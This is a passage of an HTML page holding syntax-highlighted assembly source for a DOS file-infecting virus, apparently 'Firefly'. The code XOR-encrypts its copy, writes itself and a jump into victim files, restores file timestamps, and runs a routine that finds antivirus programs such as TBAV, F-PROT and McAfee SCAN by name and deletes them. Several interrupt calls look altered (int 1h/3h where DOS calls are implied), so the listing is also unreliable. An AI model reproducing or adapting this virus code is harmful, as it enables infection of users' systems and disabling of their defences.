        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                   </span><span class="sc1">; encrypt copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">begin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc5">encryptbuffer</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; in encrypt-           </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryptlength</span><span class="sc0">                        </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">e_loop</span><span class="sc4">:</span><span class="sc0">                                                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                                  </span><span class="sc1">; XOR [bx]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">37h</span><span class="sc0">                                  </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">e_value_1</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                                </span><span class="sc1">; scrambler #1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc0">                                  </span><span class="sc1">; XOR [bx+2]</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">77h</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02h</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">e_value_2</span><span class="sc4">:</span><span class="sc0">                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">                                </span><span class="sc1">; scrambler #2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">e_loop</span><span class="sc0">                               </span><span class="sc1">; loop</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; write virus   </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encryptbuffer</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                    </span><span class="sc1">; point to front</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; write jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_jump</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">save_date</span><span class="sc4">:</span><span class="sc0">                                     
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                        </span><span class="sc1">; Date</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">; Time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">
                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03Eh</span><span class="sc0">                </span><span class="sc1">; Close file and restore  </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                     </span><span class="sc1">; attribs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; This is the end...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; My only friend, The End.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                     </span><span class="sc1">;       - Jim Morrison</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">notforme</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">new_24h</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Critical Error (Mis)handler</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'The land of Rape and Honey'</span><span class="sc0">

        </span><span class="sc1">; This area is the "intelligence" of Firefly</span><span class="sc0">
        </span><span class="sc1">; It looks for known AV names which it then deletes.</span><span class="sc0">
        </span><span class="sc1">; So it sort of shuts down the computers "immune system"</span><span class="sc0">
</span><span class="sc5">avtest</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'MI'</span><span class="sc0">    </span><span class="sc1">;Integrity Master</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;*IM</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XR'</span><span class="sc0">    </span><span class="sc1">;*rx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'PO'</span><span class="sc0">    </span><span class="sc1">;*STOP</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next1</span><span class="sc0">                      </span><span class="sc1">;(VIRSTOP)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'TS'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0">    </span><span class="sc1">;*AV  i.e. cpav</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;(TBAV) (MSAV)  </span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'TO'</span><span class="sc0">    </span><span class="sc1">;*prot  f-prot</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next2</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'RP'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next2</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">AV</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">; must be equal</span><span class="sc0">

</span><span class="sc5">next2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*scan  McAffee's </span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                      </span><span class="sc1">;(TBSCAN)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'CS'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'NA'</span><span class="sc0">    </span><span class="sc1">;*lean  CLEAN..</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next3</span><span class="sc0">                      </span><span class="sc1">; why not eh?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">    </span><span class="sc1">;(TBCLEAN)</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">

</span><span class="sc5">next3</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'CV'</span><span class="sc0">    </span><span class="sc1">; Victor Charlie</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">; default  *VC</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'KC'</span><span class="sc0">    </span><span class="sc1">; VCHECK</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next4</span><span class="sc0">                      </span><span class="sc1">; (Victor Charlie)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'EH'</span><span class="sc0">    </span><span class="sc1">; (TBCHECK) *HECK</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next4</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'ME'</span><span class="sc0">    </span><span class="sc1">; TBMEM</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next5</span><span class="sc0">                      </span><span class="sc1">; *BMEM</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'MB'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next5</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'XN'</span><span class="sc0">    </span><span class="sc1">; TBSCANX</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next6</span><span class="sc0">                      </span><span class="sc1">; *CANX</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'AC'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next6</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'EL'</span><span class="sc0">    </span><span class="sc1">; TBFILE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">next7</span><span class="sc0">                      </span><span class="sc1">; *FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'IF'</span><span class="sc0">    </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc5">next7</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AV_Detected</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_name</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; The Victim</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                    </span><span class="sc1">; Clear it's attribs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; Delete It.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                           </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Its Dead Jim'</span><span class="sc0">                               

</span><span class="sc5">vict_head</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">                 </span><span class="sc1">; 3 bytes of storage</span><span class="sc0">
</span><span class="sc5">old_21h</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; int 21 storage</span><span class="sc0">
</span><span class="sc5">old_1Ch</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">click</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">                                               

</span><span class="sc1">; The heap........   junk not needed in main program</span><span class="sc0">

</span><span class="sc5">victim_name</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_jump</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">       
</span><span class="sc5">encryptbuffer</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">



</span></div></body>
</html>
